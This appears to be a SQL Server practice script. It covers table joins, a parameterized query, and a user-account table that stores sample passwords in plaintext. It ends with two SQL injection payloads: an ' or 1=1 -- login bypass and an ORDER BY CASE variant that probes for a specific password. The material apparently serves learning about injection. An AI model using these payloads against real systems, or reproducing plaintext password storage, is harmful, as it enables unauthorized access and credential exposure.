--INNER JOIN 
--CROSS JOIN
--OUTER JOIN


CREATE TABLE Person(
	Id INT,
	[Name] VARCHAR(50),
	Age INT
)

INSERT INTO Person VALUES (1,'DANIEL',26)
INSERT INTO Person VALUES (2,'Kevin',27)

CREATE TABLE [Address](
	PId INT,
	[AddressName] NVARCHAR(50)
)

INSERT INTO [Address] VALUES (1,N'宜蘭縣宜蘭市海洋路20號')
INSERT INTO [Address] VALUES (2,N'台北市三重街10號')
INSERT INTO [Address] VALUES (3,N'TEST')



SELECT p.id,
       p.[Name],
       p.Age,
       a.AddressName
FROM Person p JOIN [Address] a ON p.Id = a.PId
WHERE p.[Name] = @Name


--user account info

CREATE TABLE [dbo].UserAccount(
	[UserID] [int] IDENTITY(1,1) NOT NULL,
	[UserName] [varchar](100) NULL,
	[PassWord] [varchar](100) NULL,
    CONSTRAINT [PK_UserAccount1] PRIMARY KEY CLUSTERED 
	(
		[UserID] ASC
	)
) 

INSERT INTO dbo.UserAccount ([UserName],[PassWord]) VALUES ('Daniel','test123')
INSERT INTO dbo.UserAccount (UserName,[PassWord]) VALUES ('Tom','test123')
INSERT INTO dbo.UserAccount (UserName,[PassWord]) VALUES ('Kevin','apple')
INSERT INTO dbo.UserAccount (UserName,[PassWord]) VALUES ('Amy','Hello')

inject attact

' or 1=1 --

'or 1=1 ORDER BY CASE WHEN [PassWord] = 'test123' THEN 0 ELSE 1 END -- 